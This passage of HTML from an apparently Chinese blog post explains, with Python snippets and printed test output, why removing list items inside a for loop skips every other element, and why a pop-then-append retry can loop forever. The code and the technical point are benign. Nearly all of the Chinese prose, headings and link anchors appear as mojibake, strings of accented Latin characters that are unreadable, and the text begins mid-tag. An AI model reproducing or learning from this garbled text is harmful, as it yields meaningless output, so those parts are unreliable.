punctuation">)</span>    test2<span class="token punctuation">(</span>getdata<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><hr><p>æµ‹è¯•ç»“æœå¦‚ä¸‹</p><pre class="language-none"><code class="language-none">&#123;&#39;name&#39;: &#39;C&#39;&#125;&#123;&#39;name&#39;: &#39;C++&#39;&#125;&#123;&#39;name&#39;: &#39;Python&#39;&#125;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;&#123;&#39;name&#39;: &#39;go&#39;&#125;&#123;&#39;name&#39;: &#39;Java&#39;&#125;&#123;&#39;name&#39;: &#39;sql&#39;&#125;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;test1new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š8 ä¸ª[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C&#39;&#125;å‰©ä½™ä»»åŠ¡ï¼š7 ä¸ª[&#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Python&#39;&#125;å‰©ä½™ä»»åŠ¡ï¼š6 ä¸ª[&#39;C++&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;go&#39;&#125;å‰©ä½™ä»»åŠ¡ï¼š5 ä¸ª[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;sql&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š4 ä¸ª[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;errorå‰©ä½™ä»»åŠ¡ï¼š4 ä¸ª[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;å‰©ä½™ä»»åŠ¡ï¼š3 ä¸ª[&#39;C++&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š2 ä¸ª[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;errorå‰©ä½™ä»»åŠ¡ï¼š2 ä¸ª[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š1 ä¸ª[&#39;C++&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;All Done!test2new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š8 ä¸ª[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š7 ä¸ª[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;sql&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š6 ä¸ª[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;errornew cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š6 ä¸ª[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;errornew cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š6 ä¸ª[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š5 ä¸ª[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;go&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š4 ä¸ª[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š3 ä¸ª[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Python&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š2 ä¸ª[&#39;C&#39;, &#39;C++&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š1 ä¸ª[&#39;C&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C&#39;&#125;All Done!</code></pre><hr><h2 id="ä»»åŠ¡æ¦‚å†µ"><a href="#ä»»åŠ¡æ¦‚å†µ" class="headerlink" title="ä»»åŠ¡æ¦‚å†µ"></a>ä»»åŠ¡æ¦‚å†µ</h2><p>è¿™ä¸ªè„šæœ¬æ˜¯ä¸ºäº†å®ŒæˆæŸä»»åŠ¡ï¼Œå°†æ‰€æœ‰ç”¨æˆ·å­˜å‚¨åœ¨ä¸€ä¸ªlisté‡Œï¼Œå³</p><pre class="language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C++"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Python"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"PHP"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"go"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Java"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"sql"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"solidity"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span></code></pre><p>å¯¹äºæ­¤ä»»åŠ¡ï¼Œä¸­é—´è¿‡ç¨‹ç›´æ¥çœç•¥ï¼Œæœ‰æ¦‚ç‡(ä¸å¯å®šå› ç´ )ä¼šå¤±è´¥ï¼Œæ‰€ä»¥æœ‰è¡¥é”™æªæ–½ã€‚</p><p>å‡ä½¿æœ¬ä»»åŠ¡è¡¥é”™æªæ–½å®Œæ•´ï¼Œä¸ä¼šå‡ºç°æ­»å¾ªç¯æƒ…å†µã€‚</p><p>å¯¹äºæœ¬æµ‹è¯•ï¼Œæ¨¡æ‹Ÿå‡ºé”™è®°å½•æ¬¡æ•°timeä¸º2æ¬¡ã€‚</p><hr><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><h3 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h3><h4 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nnew cycle!==========\n"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> user <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""xxx"""</span></code></pre><p>å¯è§å¯¹äºlistä¸­(ä¸‹ç§°ç”¨æˆ·é›†)çš„æ¯ä¸ªdict(ä¸‹ç§°ç”¨æˆ·)èµ‹ç»™userï¼Œç„¶åè¿›è¡Œå¤„ç†ä»»åŠ¡(ä¸‹ç§°ä»»åŠ¡)ï¼Œç”±äº<code>while data</code> å¿…é¡»æ‰€æœ‰ç”¨æˆ·å…¨éƒ¨å®Œæˆä»»åŠ¡æ‰ä¼šç»“æŸã€‚</p><h4 id="åŸæ€æƒ³ï¼š"><a href="#åŸæ€æƒ³ï¼š" class="headerlink" title="åŸæ€æƒ³ï¼š"></a>åŸæ€æƒ³ï¼š</h4><p>å¯¹äºæ¯ä¸ªç”¨æˆ·å…ˆå…¨éƒ¨åšä¸€éä»»åŠ¡ï¼Œç„¶åå‡ºé”™çš„ç”¨æˆ·ç”±è¡¥é”™æªæ–½è¡¥é”™</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> xxxx<span class="token punctuation">:</span>  <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    data<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>user<span class="token punctuation">)</span></code></pre><p>å¦‚ä¸Šï¼Œæ¨¡æ‹Ÿå®Œæˆä»»åŠ¡å°±ä»ç”¨æˆ·é›†ä¸­ç§»å‡ºæ­¤ç”¨æˆ·ï¼Œç„¶åå¦‚æœæœ‰ä»»åŠ¡å‡ºé”™ï¼Œç”¨æˆ·è¿˜åœ¨ç”¨æˆ·é›†é‡Œï¼Œè¾“å‡ºä¸€è¡Œ<code>new cycle!==========</code>ï¼Œç»§ç»­æ‰§è¡Œä»»åŠ¡ã€‚</p><p>ç„¶è€Œæœ€ç»ˆè¾“å‡ºå´æ˜¯å¦‚ä¸‹</p><pre class="language-none"><code class="language-none">test1new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š8 ä¸ª[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C&#39;&#125;å‰©ä½™ä»»åŠ¡ï¼š7 ä¸ª[&#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Python&#39;&#125;å‰©ä½™ä»»åŠ¡ï¼š6 ä¸ª[&#39;C++&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;go&#39;&#125;å‰©ä½™ä»»åŠ¡ï¼š5 ä¸ª[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;sql&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š4 ä¸ª[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;errorå‰©ä½™ä»»åŠ¡ï¼š4 ä¸ª[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;å‰©ä½™ä»»åŠ¡ï¼š3 ä¸ª[&#39;C++&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š2 ä¸ª[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;errorå‰©ä½™ä»»åŠ¡ï¼š2 ä¸ª[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;å‰©ä½™ä»»åŠ¡ï¼š1 ä¸ª[&#39;C++&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;All Done!</code></pre><p>å‡ºç°äº†4æ¬¡<code>new cycle!==========</code></p><h4 id="å®é™…æƒ…å†µï¼š"><a href="#å®é™…æƒ…å†µï¼š" class="headerlink" title="å®é™…æƒ…å†µï¼š"></a>å®é™…æƒ…å†µï¼š</h4><p>é€šè¿‡debugï¼Œå¯ä»¥çœ‹åˆ°</p><p>ç¬¬ä¸€æ¬¡ï¼š</p><img src="/article/pythondict/image-20210608170630964.png" class="" title="image-20210608170630964" loading="lazy"><p>ç§»å‡ºåï¼š</p><img src="/article/pythondict/image-20210608170648260.png" class="" title="image-20210608170648260" loading="lazy"><p>è¿™é‡Œå¹¶æ²¡æœ‰ä»€ä¹ˆå¼‚å¸¸ï¼Œæˆ‘ä»¬è¿‡å››æ¬¡çœ‹çœ‹</p><p>ç¬¬å››æ¬¡ï¼š</p><img src="/article/pythondict/image-20210608170759998.png" class="" title="image-20210608170759998" loading="lazy"><p>ç§»å‡ºåï¼š</p><img src="/article/pythondict/image-20210608170807924.png" class="" title="image-20210608170807924" loading="lazy"><p>ç„¶åï¼Œå®ƒç«Ÿç„¶è·³å‡ºäº†forå¾ªç¯</p><img src="/article/pythondict/image-20210608171051661.png" class="" title="image-20210608171051661" loading="lazy"><p>ä¹Ÿå°±æ˜¯è¯´<code>for user in data</code>å·²ç»èµ°å®Œä¸€éäº†</p><p>åé¢å‡ æ¬¡åŒç†</p><h4 id="åŸå› ï¼š"><a href="#åŸå› ï¼š" class="headerlink" title="åŸå› ï¼š"></a>åŸå› ï¼š</h4><p>æœ¬äººæ‰ç–å­¦æµ…ï¼Œç•¥æœ‰æ‹™è§ï¼Œå¦‚æœ‰é”™è¯¯è¿˜è¯·å¤§ä½¬æŒ‡æ­£ï¼</p><p>ç»è¿‡è€ƒè™‘ï¼Œè§‰å¾—åŸå› å¦‚ä¸‹</p><p>pythonçš„å˜é‡å®šä¹‰å¹¶æ²¡æœ‰é‚£ä¹ˆä¸¥æ ¼ï¼Œå‡­æ„Ÿè§‰è¯´ï¼Œåƒæ˜¯ä¸€ç§å®¹å™¨ã€‚</p><p><code>for user in data</code>ï¼Œå…¶å®å°±æ˜¯userå¯¹äºdataå¤„çš„æŒ‡é’ˆï¼Œæˆ‘ä»¬åšä¸ªå°æµ‹è¯•</p><pre class="language-python" data-language="python"><code class="language-python">dictlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">6</span><span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">8</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> dictlist<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    dictlist<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>i<span class="token punctuation">)</span></code></pre><p>çŒœçŒœç»“æœæ€ä¹ˆæ ·ï¼Ÿ</p><details>  <summary>ç»“æœå¦‚ä¸‹</summary>{1: 1}{3: 3}{5: 5}{7: 7}</details><p>å¯è§ï¼Œåªè¾“å‡ºäº†å•æ•°ä½</p><p><code>for i in datalist</code>æµ‹è¯•<code>datalist</code>é‡Œçš„å€¼</p><p>ç¬¬ä¸€æ¬¡ï¼Œå³ä¸º <code>datalist[0]</code>ï¼ˆè¿™é‡Œä¸è§„èŒƒåœ°ç”¨æ•°ç»„æ¥è¡¨ç¤ºï¼Œæ¯”è¾ƒç›´è§‚ï¼‰</p><p>æœ‰å€¼ä¸º{1: 1}ï¼Œä»»åŠ¡è¿›è¡Œ</p><p>ç»“æŸå<code>dictlist.remove(i)</code></p><p>æ­¤æ—¶<code>dictlist-&gt;[&#123;2: 2&#125;, &#123;3: 3&#125;, &#123;4: 4&#125;, &#123;5: 5&#125;, &#123;6: 6&#125;, &#123;7: 7&#125;, &#123;8: 8&#125;]</code> </p><p>ç¬¬äºŒæ¬¡ä¸º<code>datalist[1]-&gt;&#123;3: 3&#125;</code></p><p>åˆ™å¯ä»¥è®¤å®šï¼Œå¯¹äºdictçš„removeæ˜¯å³æ—¶å®Œæˆï¼Œè€Œiä½œä¸º<code>in data</code>çš„æŒ‡ä»£ï¼Œå…¶å®åªæ˜¯<code>for(int i=0;i&lt;data.length;i++)</code>çš„ç­‰ä»·ä»£æ¢ã€‚(æ­¤å¤„çš„è¡¨è¾¾å¹¶ä¸è§„èŒƒï¼Œä»…ä½œç¤ºæ„å‚è€ƒ)</p><p>å½“ç¬¬å››æ¬¡æ—¶ï¼Œ<code>dictlist-&gt;[&#123;2: 2&#125;, &#123;4: 4&#125;, &#123;6: 6&#125;, &#123;7: 7&#125;, &#123;8: 8&#125;]</code> </p><p><code>datalist[3]-&gt;&#123;7: 7&#125;</code>ï¼Œremove it.</p><p>ç¬¬äº”æ¬¡ï¼Œ<code>dictlist-&gt;[&#123;2: 2&#125;, &#123;4: 4&#125;, &#123;6: 6&#125;, &#123;8: 8&#125;]</code></p><p><code>datalist[4]-&gt;NULL</code>è·³å‡ºäº†å¾ªç¯</p><img src="/article/pythondict/image-20210608184852589.png" class="" title="image-20210608184852589" loading="lazy"><h5 id="é—®é¢˜ç¼˜ç”±"><a href="#é—®é¢˜ç¼˜ç”±" class="headerlink" title="é—®é¢˜ç¼˜ç”±"></a>é—®é¢˜ç¼˜ç”±</h5><p>å†™äº†ä¸ªå°è„šæœ¬ï¼Œå‡†å¤‡æŒ‰ç”¨æˆ·é¡ºåºå¤„ç†ä»»åŠ¡ï¼Œç»“æœå‘ç°å¹¶æ²¡æœ‰æŒ‰é¡ºåºæ‰§è¡Œï¼Œç„¶åè¾“å‡ºcycleåï¼Œå‘ç°æŒ‰å•æ•°æ‰§è¡Œäº†ç¬¬ä¸€éï¼Œè¿›ä¸€æ­¥æ·±ç©¶ã€‚å‘ç°äº†è¿™ä¸ªæƒ…å†µã€‚</p><hr><h3 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h3><p>é‚£å¦‚æœæˆ‘ç›´æ¥popå‡ºdictå‘¢ï¼Ÿ</p><h4 id="ä»£ç -1"><a href="#ä»£ç -1" class="headerlink" title="ä»£ç "></a>ä»£ç </h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> data<span class="token punctuation">:</span>  user <span class="token operator">=</span> data<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="åŸæ€æƒ³ï¼š-1"><a href="#åŸæ€æƒ³ï¼š-1" class="headerlink" title="åŸæ€æƒ³ï¼š"></a>åŸæ€æƒ³ï¼š</h4><p>æ—¢ç„¶forä¼šæœ‰è¶Šç•Œé—®é¢˜(ä¼¼ä¹Pythonå¹¶ä¸è§‰å¾—è¿™æ˜¯ä¸ªé—®é¢˜hhh)ï¼Œé‚£ä¹ˆå¦‚æœæ¢ç§æ–¹å¼å‘¢ã€‚</p><p>æ¯æ¬¡ç›´æ¥popå‡ºä¸€ä¸ªç”¨æˆ·ï¼Œç„¶åæ‰§è¡Œä»»åŠ¡ï¼Œå¦‚æœå‡ºé”™å°±æŠŠè¿™ä¸ªç”¨æˆ·åŠ å›ç”¨æˆ·é›†</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>  data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user<span class="token punctuation">)</span> </code></pre><p>è¿™æ ·ä¸€æ¥ï¼Œç¡®å®æ²¡å•¥é—®é¢˜</p><h4 id="å®é™…æƒ…å†µï¼š-1"><a href="#å®é™…æƒ…å†µï¼š-1" class="headerlink" title="å®é™…æƒ…å†µï¼š"></a>å®é™…æƒ…å†µï¼š</h4><p>å¯¹äºæœ¬æµ‹è¯•ï¼Œä¸éœ€è¦è€ƒè™‘å…¶ä»–å› ç´ ï¼Œè€Œå¯¹äºæ’¸çš„é‚£ä¸ªè„šæœ¬ï¼Œä¸€èˆ¬æ˜¯ä¸ä¼šå‡ºé”™ï¼Œå¦‚æœå‡ºé”™åº”è¯¥æ˜¯ä¸€æ®µæ—¶é—´å†…å‡ºé”™ï¼Œå³æ— æ³•ç«‹åˆ»è§£å†³ï¼Œéœ€è¦ç­‰å¾…ï¼ˆä¾‹å¦‚è¿™ä¸ªç”¨æˆ·ä»Šå¤©ä¸éœ€è¦æ‰§è¡Œè¿™ä¸ªä»»åŠ¡ï¼Œè¡¥æ•‘è¾¾åˆ°ä¸Šé™æ‰ä¼šæ‰§è¡Œå…¶ä»–ç”¨æˆ·ä»»åŠ¡ï¼Œä¼šå¤§å¤§æ‹–å»¶è„šæœ¬çš„è¿è¡Œé€Ÿåº¦ï¼‰ï¼Œè¿™æ—¶å€™å¦‚test1å…ˆæ‰§è¡Œå…¶ä»–ç”¨æˆ·ä»»åŠ¡å³å¯ã€‚</p><p>ä½†åœ¨å®é™…è„šæœ¬ä¸­ï¼Œç”±äºè¡¥é”™æªæ–½ï¼Œç¨‹åºä¸å†™å¥½è¡¥é”™ä¸Šé™å°±ä¼šé™·å…¥æ­»å¾ªç¯ã€‚</p><h4 id="åŸå› ï¼š-1"><a href="#åŸå› ï¼š-1" class="headerlink" title="åŸå› ï¼š"></a>åŸå› ï¼š</h4><p>é—®é¢˜åœ¨äºï¼Œpopä¼šå¼¹å‡ºç”¨æˆ·é›†æœ€åä¸€ä¸ªç”¨æˆ·ï¼Œè€Œä¸€æ—¦å‡ºç°é”™è¯¯ï¼Œè¡¥é”™æªæ–½æ˜¯å°†å…¶appendå›ç”¨æˆ·é›†ï¼Œå³è¿˜æ˜¯æœ€åä¸€ä¸ªç”¨æˆ·ï¼Œè¿™æ ·å°±ä¼šé€ æˆæ­»å¾ªç¯</p><p>è¿™é‡Œä¸èƒ½ç”¨<code>data[&#39;xxx&#39;]=xxx</code>ï¼Œå› ä¸ºå®é™…dictæœ‰å¾ˆå¤šé”®å€¼å¯¹</p><p>æ²¡å•¥å¥½çš„æ ¹æœ¬è§£å†³æ–¹æ³•ï¼Œå’±ä¸æ˜¯æç®—æ³•å’Œå¼€å‘çš„ï¼Œæ²¡æœ‰æ·±ç©¶è¿™é‡Œé¢çš„æ–¹æ³•ï¼Œå¦‚æœ‰æ–¹æ³•è¯·å¸ˆå‚…ä»¬æŒ‡æ•™ã€‚</p><hr><h2 